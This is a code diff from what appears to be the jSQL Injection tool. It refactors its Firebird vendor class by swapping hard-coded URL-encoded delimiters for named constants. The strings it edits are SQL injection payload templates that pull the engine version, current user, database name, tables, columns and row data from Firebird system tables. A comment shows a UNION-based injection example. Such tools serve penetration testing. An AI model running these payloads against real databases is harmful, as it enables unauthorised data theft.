@@ -1,5 +1,9 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,13 +12,13 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class FirebirdVendor extends AbstractVendor {
+public class FirebirdVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+rdb$get_context('SYSTEM','ENGINE_VERSION')||'%04'||rdb$get_context('SYSTEM','DB_NAME')"
-            + "||'%04'||rdb$get_context('SYSTEM','CURRENT_USER')||'%01%03%03%07'from+rdb$database";
+            "SELECT+rdb$get_context('SYSTEM','ENGINE_VERSION')||'"+ SEPARATOR_SQL +"'||rdb$get_context('SYSTEM','DB_NAME')"
+            + "||'"+ SEPARATOR_SQL +"'||rdb$get_context('SYSTEM','CURRENT_USER')||'"+ TRAIL_SQL +"'from+rdb$database";
     }
 
     @Override
@@ -25,20 +29,20 @@ public class FirebirdVendor extends AbstractVendor {
              * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
              * => use limit 1,1 instead
              */
-            "select+'%04'||rdb$get_context('SYSTEM','DB_NAME')||'%050%04%01%03%03%07'from+rdb$database{limit}";
+            "select+'"+ SEPARATOR_SQL +"'||rdb$get_context('SYSTEM','DB_NAME')||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+rdb$database{limit}";
     }
 
     @Override
     public String getSqlTables(Database database) {
         return
-            "SELECT'%04'||trim(rdb$relation_name)||'%050%04%01%03%03%07'from+rdb$relations{limit}";
+            "SELECT'"+ SEPARATOR_SQL +"'||trim(rdb$relation_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+rdb$relations{limit}";
 
     }
 
     @Override
     public String getSqlColumns(Table table) {
         return
-            "SELECT'%04'||trim(rdb$field_name)||'%050%04%01%03%03%07'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
+            "SELECT'"+ SEPARATOR_SQL +"'||trim(rdb$field_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
     }
 
     @Override
@@ -47,7 +51,7 @@ public class FirebirdVendor extends AbstractVendor {
         formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
         
         return
-            "SELECT'%04'||" + formatListColumn + "||'%050%04%01%03%03%07'from+" + table + "{limit}";
+            "SELECT'"+ SEPARATOR_SQL +"'||" + formatListColumn + "||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+" + table + "{limit}";
     }
 
     @Override
@@ -61,7 +65,7 @@ public class FirebirdVendor extends AbstractVendor {
                  "(" + sqlQuery + ")from+" +
                  startPosition + "+for+" +
                  "65536" +
-             "),'%01%03%03%07')from+RDB$DATABASE";
+             "),'"+ TRAIL_SQL +"')from+RDB$DATABASE";
      }
 
      @Override
